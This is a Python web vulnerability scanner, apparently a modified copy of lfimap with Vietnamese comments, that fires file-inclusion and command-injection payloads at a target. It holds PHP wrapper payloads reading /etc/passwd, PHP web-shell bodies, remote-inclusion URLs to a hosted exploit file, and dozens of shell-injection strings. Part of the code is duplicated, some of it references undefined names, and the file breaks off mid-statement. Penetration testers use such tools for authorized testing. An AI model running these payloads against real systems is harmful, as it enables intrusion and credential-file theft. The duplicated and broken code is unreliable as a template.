#!/usr/bin/env python3

import os
import sys
import re
import socket
import time
import random
import base64
import argparse
import requests
import requests.exceptions
import threading
import http.client
import http.server
import socketserver
import traceback
import errno
import fileinput
import urllib.parse as urlparse
import urllib3

from datetime import datetime
from urllib.parse import unquote
from contextlib import closing
from argparse import RawTextHelpFormatter
# from requests.packages.urllib3.exceptions import InsecureRequestWarning
# requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# TODO create a config which can be modified by the user || chuỗi người dùng có thể sửa
checkedHosts = []
exploits = []
headers = {}
proxies = {}
rfi_test_port = 8000
tOut = None
initialReqTime = 0
scriptName = ""
tempArg = ""
webDir = ""
skipsqli = False
previousPrint = ""
stats = {}
stats["getRequests"] = 0
stats["postRequests"] = 0
stats["requests"] = 0
stats["info"] = 0
stats["vulns"] = 0
stats["urls"] = 0
banner_text = '''
     ▀█████▄    ,████▌
      ╙██████µ  █████                     ███████╗    ██╗     
         ▀████▄ ████                      ██╔════╝    ██║   
          ,▄▄█████▀                       █████╗      ██║   
        ▄█▀████████C                      ██╔══╝      ██║   
    ░  █████████████`                     ██║         ██║    
      ░█████████████░                     ██║         ██║ 
         ▀▀████████▀,                     ╚═╝         ╚═╝   
         ▄,██▌▀▀▀▄▄ ▀        <<<<<<<< STARTING FILE INCLUSION >>>>>>>>       
         ▐▀▀▀▌▀``
    ''' + ']'
# Add them from the most complex one to the least complex. This is important.
TO_REPLACE = ["<IMG sRC=X onerror=jaVaScRipT:alert`xss`>", "<img src=x onerror=javascript:alert`xss`>",
              "%3CIMG%20sRC%3DX%20onerror%3DjaVaScRipT%3Aalert%60xss%60%3E",
              "%253CIMG%2520sRC%253DX%2520onerror%253DjaVaScRipT%253Aalert%2560xss%2560%253E",
              'aahgpz"ptz>e<atzf', "aahgpz%22ptz%3Ee%3Catzf",
              "Windows/System32/drivers/etc/hosts", "C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
              "file://C:\Windows\System32\drivers\etc\hosts", "%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
              "C:\Windows\System32\drivers\etc\hosts", "Windows\\System32\\drivers\\etc\\hosts",
              "%windir%\System32\drivers\etc\hosts",

              "file%3A%2F%2F%2Fetc%2Fpasswd%2500", "file%3A%2F%2F%2Fetc%2Fpasswd",
              "cat%24IFS%2Fetc%2Fpasswd", "cat${IFS%??}/etc/passwd", "/sbin/cat%20/etc/passwd",
              "/sbin/cat /etc/passwd", "cat%20%2Fetc%2Fpasswd",
              "cat /etc/passwd", "%2Fetc%2Fpasswd", "/etc/passwd",
              "ysvznc", "ipconfig",
              ]


KEY_WORDS = ["root:x:0:0", "<IMG sRC=X onerror=jaVaScRipT:alert`xss`>",
             "<img src=x onerror=javascript:alert`xss`>",
             "cm9vdDp4OjA", "Ond3dy1kYX", "ebbg:k:0:0", "d3d3LWRhdG", "aahgpz\"ptz>e<atzf",
             "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0", "ZGFlbW9uOng6",
             "; for 16-bit app support", "sample HOSTS file used by Microsoft",
             "iBvIG8gdCA6IHggOiA", "OyBmb3IgMTYtYml0IGFwcCBzdXBw", "c2FtcGxlIEhPU1RTIGZpbGUgIHVzZWQgYnkgTWljcm9zb2",
             "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
             "; sbe 16-ovg ncc fhccbeg", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
             ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
             "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x", "PD9w",
             "961bb08a95dbc34397248d92352da799", "PCFET0NUWVBFIGh0b",
             "PCFET0N", "PGh0b"]
# trả về đường dẫn thư mục chứa tập tin mã nguồn hiện tại.
scriptDirectory = os.path.dirname(__file__)


class ICMPThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.result = None

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              socket.IPPROTO_ICMP)
            s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
            self.result = False

            while True:
                data, addr = s.recvfrom(1024)
                if (data):
                    self.result = True
        except PermissionError:
            if (args.verbose):
                print(
                    "[-] Raw socket access is not allowed. For blind ICMP command injection test, rerun lfimap as admin/sudo with '-c'")

    def getResult(self):
        return self.result

    def setResult(self, boolean):
        self.result = boolean


class ServerHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=webDir, **kwargs)

    def log_message(self, format, *args):
        pass


def base64_encode(string):
    return base64.b64encode(bytes(string, 'utf-8')).decode()


def urlencode(string):
    return urlparse.quote(string, safe='')


def encode(payload):
    if (args.encodings):
        for encoding in args.encodings:
            if (encoding == "B"):
                payload = base64_encode(payload)
            elif (encoding == "U"):
                payload = urlencode(payload)
    return payload


def prepareHeaders():
    user_agents = [
        "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
        "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
        "Mozilla/3.01 (Macintosh; PPC)",
        "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
        "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
        "Opera/8.00 (Windows NT 5.1; U; en)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
    ]
    headers = {}

    # if (args.agent):
    #    headers['User-Agent'] = agent
    # else:  # TODO check these kidna stay in the request after this function call
    #    headers['User-Agent'] = random.choice(user_agents)
    # if (args.referer):
    #    headers['Referer'] = referer
    headers['User-Agent'] = random.choice(user_agents)
    headers['Accept'] = '*/*'
    headers['Connection'] = 'Close'
    return headers


def serve_forever():
    global webDir

    socketserver.TCPServer.allow_reuse_address = True
    try:
        with socketserver.TCPServer(("", rfi_test_port), ServerHandler) as httpd:
            if (args.verbose):
                print("[i] Opening temporary local web server on port " + str(rfi_test_port) +
                      " and hosting /exploits that will be used for test inclusion")
            try:
                httpd.serve_forever()
            except:
                httpd.server_close()
    except:
        if (args.verbose):
            print("[i] Cannot setup local web server on port " +
                  str(rfi_test_port) + ", it's in use or unavailable...")

# TODO REMOVE ICMP feature its shite


def addHeader(newKey, newVal):
    headers[newKey] = newVal


def prepareRequest(parameter, payload, checkEncode=False):
    global headers

    # Nếu tham số args.param được tìm thấy trong URL (args.url), nó sẽ được thay thế bằng giá trị payload sau khi được mã hóa. Kết quả được lưu trong biến reqUrl.
    if (args.param in args.url and checkEncode == True):
        reqUrl = args.url.replace(args.param, encode(payload))
    else:
        reqUrl = args.url.replace(args.param, payload)
    # print(reqUrl)
    if (args.postreq):
        reqData = args.postreq.replace(parameter, encode(payload)).lstrip()
    else:
        reqData = ""
    reqHeaders = {}
    # Kiểm tra xem có thay thế nào đã được thực hiện trong header hay không
    if (args.param in headers.values()):
        for key, value in headers.items():
            if (args.param in value):
                reqHeaders[key.strip()] = value.replace(
                    args.param, encode(payload)).encode('utf-8')
            else:
                reqHeaders[key] = value

    else:
        return reqUrl, headers, reqData
    return reqUrl, reqHeaders, reqData

# url: URL mục tiêu của yêu cầu.
# headersData: Dữ liệu header của yêu cầu.
# postData: Dữ liệu POST của yêu cầu.
# proxy: Proxy được sử dụng cho yêu cầu.
# exploitType: Loại khai thác được sử dụng.
# exploitMethod: Phương thức khai thác được sử dụng.
# exploit: Cờ để xác định liệu yêu cầu là một yêu cầu khai thác hay không (mặc định là False).


def REQUEST(url, headersData, postData,  exploitType, exploit=False):
    global tOut

    doContinue = True
    res = None

    if (not postData):  # Kiểm tra và xử lý dữ liệu POST nếu nó không tồn tại.
        postData = ""
    try:
        stats["requests"] += 1
        if (exploit):
            # Thực hiện yêu cầu HTTP bằng cách sử dụng requests.request với các tham số như phương thức (args.method), URL, dữ liệu POST, header và proxy.
            if (tOut is not None):
                res = requests.request(args.method, url, data=postData.encode(
                    "utf-8"), headers=headersData,  verify=False, timeout=tOut)
            else:
                res = requests.request(args.method, url, data=postData.encode(
                    "utf-8"), headers=headersData,  verify=False)
        else:
            if (tOut is not None):
                res = requests.request(args.method, url, data=postData.encode(
                    "utf-8"), headers=headersData,  verify=False, timeout=tOut)
            else:
                res = requests.request(args.method, url, data=postData.encode(
                    "utf-8"), headers=headersData,  verify=False)
            # Kiểm tra và xử lý kết quả của yêu cầu:

            # Nếu exploit là True, gọi hàm init để kiểm tra và xử lý kết quả yêu cầu khai thác.
            # Nếu init trả về True, gán doContinue thành False để dừng thực hiện các yêu cầu tiếp theo.
            # print(res.text)
            if (init(res, exploitType, url, postData)):
                doContinue = False

        if (args.log):  # thực hiện ghi log
            with open(args.log, 'a+') as fp:

                # log request
                splitted = url.split("/")
                fp.write(res.request.method + " " + url.replace(''.join(
                    splitted[0] + "/" + splitted[1] + "/" + splitted[2]), "") + " HTTP/1.1\n")
                fp.write("Host: " + splitted[2] + "\n")
                for k, v in res.request.headers.items():  # ghi từng cặp key-value vào log bằng cách sử dụng Trước khi ghi, kiểm tra xem key và value có phải kiểu byte không
                    # Nếu không phải, chuyển đổi chúng thành chuỗi sử dụng decode('utf-8').
                    if (not (isinstance(k, str))):
                        k = k.decode('utf-8')
                    if (not (isinstance(v, str))):
                        v = v.decode('utf-8')
                    fp.write(k + ": " + v + "\n")
                # Kiểm tra xem có dữ liệu body trong yêu cầu không (res.request.body).
                # Nếu có, ghi hai dòng trống ("\n"*2) vào log, sau đó ghi dữ liệu body (đã được chuyển đổi thành chuỗi sử dụng decode('utf-8')) vào log.
                if (res.request.body):
                    fp.write("\n"*2)
                    fp.write(res.request.body.decode('utf-8'))
                fp.write("\n"*3)

                # log response
                protocol = "HTTP/1.1"

                fp.write(protocol + " " + str(res.status_code) +
                         " " + res.reason + "\n")
                for k, v in res.headers.items():
                    if (not (isinstance(k, str))):
                        k = k.decode('utf-8')
                    if (not (isinstance(v, str))):
                        v = v.decode('utf-8')
                    fp.write(k + ": " + v + "\n")
                fp.write("\n\n")
                fp.write(res.text + "\n")
                fp.write("--\n\n\n")

        if (args.delay):  # set delaay cho mỗi lần gửi
            time.sleep(args.delay/1000)
    except KeyboardInterrupt:  # các mã lỗi
        print("\nKeyboard interrupt detected. Exiting...")
        lfimap_cleanup()
    except requests.exceptions.InvalidSchema:
        if (args.verbose):
            print(
                "InvalidSchema exception detected. Server doesn't understand the parameter value.")
    except socket.timeout:
        if (args.verbose):
            print("Socket timeout. Skipping...")
    except requests.exceptions.ReadTimeout:
        if (args.verbose):
            print("Read timeout. Skipping...")
    except urllib3.exceptions.ReadTimeoutError:
        if (args.verbose):
            print("Timeout detected. Skipping...")
    except:
        raise

    return res, doContinue


def init(req, explType, getVal, postVal, cmdInjectable=False):

    if (scriptName != ""):  # Kiểm tra nếu scriptName khác rỗng, thêm scriptName và các phiên bản có thể của nó vào danh sách TO_REPLACE. Điều này đảm bảo rằng các chuỗi có chứa scriptName sẽ được xem là tiềm năng để thay thế
        TO_REPLACE.append(scriptName)
        TO_REPLACE.append(scriptName+".php")
        TO_REPLACE.append(scriptName+"%00")

    if (args.lhost != None):  # Kiểm tra nếu args.lhost khác None, thêm các phiên bản khác nhau của chuỗi ping kết hợp với args.lhost vào danh sách TO_REPLACE. Điều này giúp xác định các chuỗi có chứa lệnh ping và args.lhost là tiềm năng để thay thế
        TO_REPLACE.append("ping%20-c%201 " + args.lhost)
        TO_REPLACE.append("ping%20-c%201%20" + args.lhost)
        TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
        TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
        TO_REPLACE.append(
            "test%3Bping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
    # Kiểm tra xem yêu cầu có chứa payload tấn công hoặc có khả năng bị tấn công không bằng cách gọi hàm checkPayload(req) hoặc kiểm tra cmdInjectable

    if (checkPayload(req) or cmdInjectable):
        # Lặp qua danh sách TO_REPLACE và kiểm tra xem có chuỗi TO_REPLACE[i] nào xuất hiện trong getVal, postVal, hoặc getVal kết hợp với "?c=".
        # Nếu có, thực hiện thay thế chuỗi TO_REPLACE[i] bằng tempArg trong getVal và postVal
        for i in range(len(TO_REPLACE)):
            if (getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
                u = getVal.replace(TO_REPLACE[i], tempArg)
                p = postVal.replace(TO_REPLACE[i], tempArg)
                # Kiểm tra xem có sự xuất hiện của các từ khóa liên quan đến hệ điều hành Windows trong TO_REPLACE[i] hoặc trong nội dung của yêu cầu (req.text).
                # Nếu có, gán giá trị "windows" cho biến os, ngược lại gán giá trị "linux".
                if ("windows" in TO_REPLACE[i].lower() or "ipconfig" in TO_REPLACE[i].lower() or "Windows IP Configuration" in req.text):
                    os = "windows"
                else:
                    os = "linux"
                # In thông báo về việc phát hiện lỗ hổng và tăng giá trị của stats["vulns"] lên.
                if (postVal == ""):
                    print("[+] " + explType + " -> '" + getVal + "'")
                    stats["vulns"] += 1
                else:
                    print("[+] " + explType + " -> '" + getVal +
                          "' -> HTTP POST -> '" + postVal + "'")
                    stats["vulns"] += 1

                if not args.no_stop:
                    return True
                return False
    # Trả về False nếu không xác định được payload tấn công hoặc
    return False

# Checks if sent payload is executed, if any of the below keywords are in the response, returns True


def checkPayload(webResponse):
    # Lặp qua từng từ khóa trong danh sách KEY_WORDS.
    for word in KEY_WORDS:
        # Kiểm tra xem webResponse có tồn tại hay không (không phải None).
        if (webResponse):
            # Nếu từ khóa hiện tại (word) xuất hiện trong nội dung của webResponse.text
            if (word in webResponse.text):
                # Kiểm tra nếu từ khóa là "PD9w" và chuỗi "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" cũng xuất hiện trong nội dung của webResponse.text. Nếu có, trả về False.
                if (word == "PD9w" and "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" in webResponse.text):
                    return False
                return True
    return False  # để chỉ ra rằng không có payload tấn công được phát hiện.


def main():
    global exploits
    #global proxies

    if ("http" not in args.url):  # kiểm tra url
        if (args.verbose):
            print("No scheme provided in '" +
                  url + "'. Defaulting to http://")
        args.url = "http://" + args.url

    try:
        # Check if url is accessible
        # Hàm này được gọi để chuẩn bị URL, headers và dữ liệu POST cho yêu cầu kiểm tra. Giá trị trả về được lưu trong biến url, headers và postTest.
        url, headers, postTest = prepareRequest(args.param, "test")
        # Hàm này được gọi để thực hiện yêu cầu HTTP kiểm tra
        r, _ = REQUEST(url, headers, postTest, "test", "test")

        # Thời gian thực hiện yêu cầu được lưu trong biến initialReqTime.
        initialReqTime = r.elapsed.total_seconds()
        okCode = False
        # Nếu args.http_valid được chỉ định, vòng lặp kiểm tra xem mã HTTP của yêu cầu có trùng khớp với các mã được chỉ định trong args.http_valid không.
        # Nếu không có mã HTTP nào khớp, chương trình sẽ hiển thị thông báo không thể truy cập URL và thoát.

        # Nếu args.http_valid không được chỉ định, chương trình sẽ kiểm tra xem mã HTTP của yêu cầu có phải là 404 hay không.
        # Nếu là 404, chương trình sẽ hiển thị thông báo không thể truy cập URL và thoát.
        if (args.http_valid):
            for http_code in args.http_valid:
                if (http_code == r.status_code):
                    okCode = True

            if (not okCode):
                print("[-] " + args.url + " is not accessible. HTTP code " +
                      str(r.status_code) + ".")
                print("[i] Try specifying parameter --http-ok " +
                      str(r.status_code) + "\n")
                sys.exit(-1)

        else:
            if (r.status_code == 404):
                print("[-] " + args.url + " is not accessible. HTTP code " +
                      str(r.status_code) + ". Exiting...")
                print("[i] Try specifying parameter --http-ok " +
                      str(r.status_code) + "\n")
                sys.exit(-1)

        stats["urls"] += 1
        url = args.url
        # Perform all tests
        test_filter(url)
        print("\n" + "-"*40+"\n")
        test_input(url)
        print("\n" + "-"*40+"\n")
        test_data(url)
        print("\n" + "-"*40+"\n")
        test_expect(url)
        print("\n" + "-"*40+"\n")
        test_rfi(url)
        print("\n" + "-"*40+"\n")
        test_file_trunc(url)
        print("\n" + "-"*40+"\n")
        test_trunc(url)
        print("\n" + "-"*40+"\n")
        test_cmd_injection(url)

        lfimap_cleanup()

    except requests.exceptions.ConnectTimeout:
        print("[-] URL '" + args.url + "' timed out. Skipping...")
    except ConnectionRefusedError:
        raise
        print("[-] Failed to establish connection to " + args.url)
    except urllib3.exceptions.NewConnectionError:
        print("[-] Failed to establish connection to " + args.url)
    except OSError:
        raise
        print("[-] Failed to establish connection to " + args.url)
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...")
        lfimap_cleanup()
    except:
        raise

    lfimap_cleanup()

# Mục đích của đoạn mã này là kiểm tra các lỗ hổng bao gồm tập tin bằng cách cố gắng bao gồm các tập tin cụ thể bằng cách sử dụng các định dạng đường dẫn tập tin khác nhau.


def test_rfi(url):
    global webDir

    if (args.verbose):
        print("[i] Testing remote file inclusion...")

    # Localhost RFI test
    if (args.lhost):
        try:
            # Setup exploit serving path
            if (os.access(scriptDirectory + "/exploits", os.R_OK)):
                webDir = scriptDirectory + "/exploits"
            else:
                print("Directory '" + scriptDirectory +
                      "/exploits' can't be accessed. Cannot setup local web server for RFI test.")
                return

            threading.Thread(target=serve_forever).start()
            rfiTest = []
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc%00".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.gif".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.png".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.jsp".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.html".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.php".format(
                args.lhost, str(rfi_test_port)))

            for test in rfiTest:
                u, reqHeaders, postTest = prepareRequest(args.param, test)
                _, br = REQUEST(u, reqHeaders, postTest,
                                "RFI", False)
                if (not br):
                    return
                if (args.quick):
                    return
        except:
            raise
            pass

    # Internet RFI test
    if (args.verbose):
        print("[i] Trying to include internet-hosted file...")

    pylds = []
    pylds.append(
        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.php")
    pylds.append(
        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.jsp")
    pylds.append(
        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.html")
    pylds.append(
        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.gif")
    pylds.append(
        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.png")

    for pyld in pylds:
        try:
            u, reqHeaders, postTest = prepareRequest(args.param, pyld)
            _, br = REQUEST(u, reqHeaders, postTest,
                            "RFI", False)
            if (not br):
                return
            if (args.quick):
                return
        except:
            pass


def test_cmd_injection(url):
    if (args.verbose):
        print("[i] Testing for classic results-based os command injection...")

    cmdList = []
    cmdList.append(";cat /etc/passwd;")
    cmdList.append(";ipconfig;")

    cmdList.append(";cat /etc/passwd;")
    cmdList.append("||cat /etc/passwd||")
    cmdList.append("&&cat /etc/passwd||")
    cmdList.append("%3Bcat%20/etc/passwd")
    cmdList.append("%26%26cat%20/etc/passwd")
    cmdList.append("%26cat%20/etc/passwd")
    cmdList.append("%7C%7Ccat%20/etc/passwd%3B")
    cmdList.append("%7C%7Ccat%20/etc/passwd%7C")
    cmdList.append("1;cat${IFS%??}/etc/passwd;")
    cmdList.append("%3Bcat%24IFS%2Fetc%2Fpasswd%3B")
    cmdList.append("printf%20%60cat%20%2Fetc%2Fpasswd%60")
    cmdList.append(";/sbin/cat /etc/passwd")
    cmdList.append("a);cat /etc/passwd;")
    cmdList.append(";system('cat%20/etc/passwd')")
    cmdList.append("%3Bsystem%28%27ipconfig%27%29")
    cmdList.append("%3Bsystem%28%27ipconfig%27%29%3B")
    cmdList.append("%0Acat%20/etc/passwd")
    cmdList.append("%0Acat%20/etc/passwd%0A")
    cmdList.append("$;/sbin/cat /etc/passwd||")
    cmdList.append("%0A%0Dcat%20/etc/passwd%0A%0D")
    cmdList.append("$(`cat /etc/passwd`)")
    cmdList.append("||ipconfig||")
    cmdList.append("&&ipconfig&&")
    cmdList.append("%3Bipconfig")
    cmdList.append("%3Bipconfig%3B")
    cmdList.append("%3B%3Bipconfig%3B%3B")
    cmdList.append("%26ipconfig")
    cmdList.append("%26ipconfig%26")
    cmdList.append("%26%26ipconfig%26%26")
    cmdList.append("%7Cipconfig")
    cmdList.append("%7Cipconfig%7C")
    cmdList.append("%7C%7Cipconfig%7C%7C")

    for i in range(len(cmdList)):
        u, reqHeaders, postTest = prepareRequest(
            args.param, cmdList[i])  # kiểm tra lại url
        _, br = REQUEST(u, reqHeaders, postTest, "RCE")
        if (not br):
            return
        if (i == 1 and args.quick):
            return

     # ICMP exfiltration technique
    if (args.lhost):
        if (args.verbose):
            print("[i] Testing for blind OS command injection via ICMP exfiltration...")

        t = ICMPThread()
        t.start()

        icmpTests = []
        icmpTests.append(";ping -c 1;" + args.lhost)
        icmpTests.append(";ping -n 1;" + args.lhost)
        icmpTests.append(
            ";ping%24%7BIFS%25%3F%3F%7D-c%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0};".format(args.lhost))
        icmpTests.append(
            ";ping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0};".format(args.lhost))

        for i in range(len(icmpTests)):
            url, reqHeaders, postTest = prepareRequest(
                args.param, icmpTests[i])
            _, br = REQUEST(url, reqHeaders, postTest, "RCE")
            if (t.getResult() == True):
                t.setResult(False)
                if (not br):
                    return
                if (i == 1 and args.quick):
                    return


def test_file_trunc(url):
    if (args.verbose):
        print("[i] Testing file wrapper inclusion...")

    tests = []
    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd")
    tests.append(
        "file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")

    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
    tests.append(
        "file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")

    for i in range(len(tests)):
        u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
        _, br = REQUEST(u, reqHeaders, postTest, "LFI")
        if (not br):
            return
        if (i == 1 and args.quick):
            return


def test_trunc(url):
    if (args.verbose):
        print("[i] Testing path truncation using '" +
              truncWordlist + "' wordlist...")
    i = 0
    with open(truncWordlist, "r") as f:
        for line in f:
            line = line.replace("\n", "")
            u, reqHeaders, postTest = prepareRequest(args.param, line)
            _, br = REQUEST(u, reqHeaders, postTest, "LFI")
            #print(_, br)
            if (not br):
                return
            if (i == 1 and args.quick):
                return
            i += 1
    return


def test_input(url):
    if (args.postreq):
        if (args.param in args.postreq):
            if (args.verbose):
                print(
                    "[i] Lfimap doesn't support POST argument testing with input wrapper. Skipping input wrapper test...")
            return

    if (args.verbose):
        print("[i] Testing input wrapper...")

    tests = []
    tests.append("php%3a%2f%2finput&cmd=cat%20%2Fetc%2Fpasswd")
    tests.append("php%3a%2f%2finput&cmd=ipconfig")

    posts = []
    posts.append("<?php echo(shell_exec($_GET['cmd']));?>")
    posts.append("<?php echo(passthru($_GET['cmd']));?>")
    posts.append("<?php echo(system($_GET['cmd']));?>")

    for i in range(len(tests)):
        u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
        for j in range(len(posts)):
            _, br = REQUEST(u, reqHeaders, posts[j], "RCE")
            if (not br):
                return
            if (j == 1 and args.quick):
                return
    return


def test_expect(url):
    if (args.verbose):
        print("[i] Testing expect wrapper...")

    tests = []
    tests.append("expect%3A%2F%2Fcat%20%2Fetc%2Fpasswd")
    tests.append("expect%3A%2F%2Fipconfig")

    for i in range(len(tests)):
        u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
        _, br = REQUEST(u, reqHeaders, postTest, "RCE")
        if (not br):
            return
        if (i == 1 and args.quick):
            return
    return


def test_filter(url):
    if (args.verbose):
        print("[i] Testing filter wrapper...")

    global scriptName

    tests = []
    tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd")
    tests.append(
        "php%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")

    tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd%2500")
    tests.append(
        "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd")
    tests.append(
        "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%2500")
    tests.append(
        "php%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")
    tests.append(
        "php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")
    tests.append(
        "php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")

    script = os.path.splitext(os.path.basename(urlparse.urlsplit(url).path))
    scriptName = script[0]

    # If '/?=' in url
    if (scriptName == ""):
        scriptName = "index"

    tests.append(
        "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName)
    tests.append(
        "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName + ".php")
    tests.append(
        "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName + "%2500")

    for i in range(len(tests)):
        u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
        _, br = REQUEST(u, reqHeaders, postTest,  "LFI")
        if (not br):
            return
        if (i == 1 and args.quick):
            return

    return


def test_data(url):
    if (args.verbose):
        print("[i] Testing data wrapper...")

    tests = []

    if (not args.postreq):
        tests.append(
            "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20%2Fetc%2Fpasswd")
        tests.append(
            "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")

        for i in range(len(tests)):
            u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
            _, br = REQUEST(u, reqHeaders, postTest,  "RCE", )
            if (not br):
                return
    else:
        urls = []
        urls.append("?c=cat%20%2Fetc%2Fpasswd")
        urls.append("?c=ipconfig")

        test = "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"

        for i in range(len(urls)):
            url, reqHeaders, postTest = prepareRequest(args.param, test)
            _, br = REQUEST(
                url + encode(urls[i]), reqHeaders, postTest, "RCE")
            if (not br):
                return
    return

# Cleans up all created files during testing


def test_rfi(url):
    global webDir

    if (args.verbose):
        print("[i] Testing remote file inclusion...")

    # Localhost RFI test
    if (args.lhost):
        try:
            # Setup exploit serving path
            if (os.access(scriptDirectory + "/exploits", os.R_OK)):
                webDir = scriptDirectory + "/exploits"
            else:
                print("Directory '" + scriptDirectory +
                      "/exploits' can't be accessed. Cannot setup local web server for RFI test.")
                return

            threading.Thread(target=serve_forever).start()
            rfiTest = []
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc%00".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.gif".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.png".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.jsp".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.html".format(
                args.lhost, str(rfi_test_port)))
            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.php".format(
                args.lhost, str(rfi_test_port)))

            for test in rfiTest:
                u, reqHeaders, postTest = prepareRequest(args.param, test)
                _, br = REQUEST(u, reqHeaders, postTest,
                                "RFI", False)
                if (not br):
                    return
                if (args.quick):
                    return
        except:
            raise
            pass

    # Internet RFI test
    if (args.verbose):
        print("[i] Trying to include internet-hosted file...")

    pylds = []
    pylds.append(
